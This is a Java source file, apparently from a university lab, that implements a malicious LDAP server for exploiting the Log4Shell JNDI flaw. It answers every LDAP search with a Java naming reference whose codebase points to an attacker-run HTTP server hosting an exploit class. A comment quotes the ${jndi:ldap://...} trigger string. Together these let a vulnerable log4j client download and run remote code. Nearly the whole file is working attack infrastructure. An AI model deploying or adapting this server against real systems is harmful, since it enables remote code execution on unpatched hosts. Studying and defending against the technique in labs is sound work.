package ch.unige.ldap;

import java.net.InetAddress;
import javax.net.SocketFactory;
import com.unboundid.ldap.sdk.Entry;
import javax.net.ServerSocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;

/**
 * LDAP server implementation returning JNDI references
 */
public class MaliciousLDAPServer {

    private int LDAP_PORT = 1389;
    private String LDAP_BASE = "dc=unige,dc=ch";

    public MaliciousLDAPServer(String ldap_base, int ldap_port, int netcat_port) {
        this.LDAP_PORT = ldap_port;
        this.LDAP_BASE = ldap_base;
    }

    public void listen() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(
                new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"), 
                    this.LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + this.LDAP_PORT);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /*
     * Helper class to intercept an LDAP search query and send back an entry describing
     * a java class with an URL that points towards an HTTP server hosting a .class file. 
     * This class is registered by config.addInMemoryOperationInterceptor() to intercept
     * LDAP queries. 
     */
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        /** {@inheritDoc} */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            // create new entry with request base distinguished name, in the log4j JNDI lookup
            // ${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE} what follows the 1389/ will be
            // the base distinguished name, base will be the name of the exploit class. 
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);                                                                              

            try {                                                                       
                System.out.println("Send LDAP reference result for " + base + " java object.");
    
                e.addAttribute("objectClass", "javaNamingReference");                   // entry is a JavaNamingReference
                e.addAttribute("javaClassName", "foo");                                 // entry is a Java Class, with name foo (this value doesn't matter)
                e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");      // java code is hosted at http://http_server_ip:web_port/Exploit.class
                e.addAttribute("javaFactory", base);                                                   // class name of the object factory, which here is just the constructor's name.
                
                System.out.println("Sending Entry: \n" + e.toLDIFString());

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }
    }
}
